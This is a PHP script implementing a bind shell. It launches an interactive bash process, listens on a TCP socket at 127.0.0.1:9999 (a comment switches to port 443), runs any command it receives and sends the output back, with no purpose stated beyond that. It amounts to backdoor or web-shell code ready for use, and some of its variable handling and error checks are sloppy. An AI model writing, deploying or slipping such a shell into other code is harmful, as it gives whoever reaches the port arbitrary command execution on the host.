<?php
    
    class Shell
	{
        private $process;
        private $pipes;
        private $socket;
        private $shell_res_his = '';
        
        public function __construct()
        {
            $descriptorspec = array(
			0 => array("pipe", "r"),
			1 => array("pipe", "w"),
			2 => array("file", "/dev/null","a")
			);
 
	        $this->process = proc_open("bash -i", $descriptorspec,  $this->pipes);
	        stream_set_blocking( $this->pipes[0], 0);
	        stream_set_blocking( $this->pipes[1], 0);
	        
	        if(!is_resource($this->process))
	           echo 'open shell process failed <BR>';
	        
	        if(($this->socket = socket_create(AF_INET,SOCK_STREAM,SOL_TCP)) < 0)
	        {
	            echo 'creat socket failed'.socket_strerror($this->socket);
	            return '';
	        }
	        
	        if(($ret = socket_bind($this->socket,'127.0.0.1', 9999)) < 0)
	        #if(($ret = socket_bind($this->socket,'127.0.0.1', 443)) < 0)
	        {
	            echo 'bind failed'.socket_strerror($ret);
                $this->close();
	        }
        }
        
        public function run()
        {
            if(($ret = socket_listen($this->socket,4)) < 0)
            {
                echo 'listen failed'.socket_strerror($ret);
                $this->close();
            }
            
            while(true)
            {
                $client_sock = socket_accept($this->socket);
                
                #recv cmd str
                $cmd = socket_read($client_sock, 1024);
                #echo 'shell_cmd:'.$cmd;
                #echo '<BR>';
                $shell_res_his .= 'shell_cmd:'.$cmd.'<BR>';
                if($cmd == 'exit()')
                {
                    echo $shell_res_his;
                    echo 'exit() <BR>';
                    
                    #close socket
                    socket_close($client_sock);
                    socket_close($this->socket);
                    $this->close();
                    
                    return '';
                }
                
                #send shell result
                $res = 'shell_result:'.$this->exec($cmd).'<BR>';
                #echo $res;
                $shell_res_his .= $res;
                socket_write($client_sock, $res, strlen($res));
                
                #close client socket
                socket_close($client_sock);
            }
        }
        
        private function exec($cmd)
        {
	        fwrite($this->pipes[0], $cmd.PHP_EOL, strlen($cmd) + 1);
	        fflush($this->pipes[0]);
		
		    sleep(1);
		    $res = fread($this->pipes[1], 4096);
		    
		    #echo 'res'.$res;
		    return $res;
        }
        
        private function close()
        {
            fclose($this->pipes[0]);
		    fclose($this->pipes[1]);
		    proc_close($this->process);
        }
    }
    
    $shell = new Shell();
    $shell->run();
?>
